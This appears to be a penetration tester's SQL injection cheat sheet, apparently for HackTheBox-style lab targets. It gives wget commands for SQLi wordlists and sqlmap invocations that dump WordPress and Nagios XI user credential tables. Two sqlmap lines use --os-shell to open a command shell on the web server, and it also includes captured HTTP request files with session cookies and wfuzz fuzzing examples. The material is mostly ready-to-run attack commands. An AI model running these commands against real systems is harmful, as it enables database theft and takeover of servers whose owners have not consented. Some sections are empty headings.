**Wordlists**
```bash
sudo wget -P /usr/share/wfuzz/wordlist/Injections/ https://raw.githubusercontent.com/PenTestical/sqli/refs/heads/main/hugeSQL.txt
sudo wget -P /usr/share/wfuzz/wordlist/Injections/ https://raw.githubusercontent.com/PenTestical/sqli/refs/heads/main/unionboss.txt
```

# sqlmap
```bash
sqlmap -u 'https://phoenix.htb/forum/?subscribe_topic=*' --technique=T
sqlmap -u 'https://phoenix.htb/forum/?subscribe_topic=*' --technique=T --level 5 --risk 3 --dbms=mysql --dbs --batch
sqlmap -u 'https://phoenix.htb/forum/?subscribe_topic=*' --technique=T --level 5 --risk 3 --dbms=mysql --dump -D wordpress -T wp_users -C user_login,user_pass

# req.txt
sqlmap -r sqlmap_req.txt -p id -method POST --risk=3 --level=5 --force-ssl -D nagiosxi -T xi_users --dump --flush-session --batch

## sqlmap_req.txt
GET /nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3 HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=n22hmvstocuqq45g4v69ap9d1l
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close

#############################################################################################

cat post.txt
	POST /search.php HTTP/1.1
	Host: 192.168.50.19
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 9
	Origin: http://192.168.50.19
	Connection: close
	Referer: http://192.168.50.19/search.php
	Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
	Upgrade-Insecure-Requests: 1
	
	item=test

sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
sqlmap -r post.txt -p mail-list --os-shell --web-root "/var/www/html/"
```

## sqlmap for two level injection

# ffuf


# wfuzz
```bash
# Example usage for GET requests
wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/hugeSQL.txt "http://127.0.0.1/index.php?id=FUZZ"

# Example usage for POST requests
wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/hugeSQL.txt -d "username=admin\&password=FUZZ" http://127.0.0.1/admin
```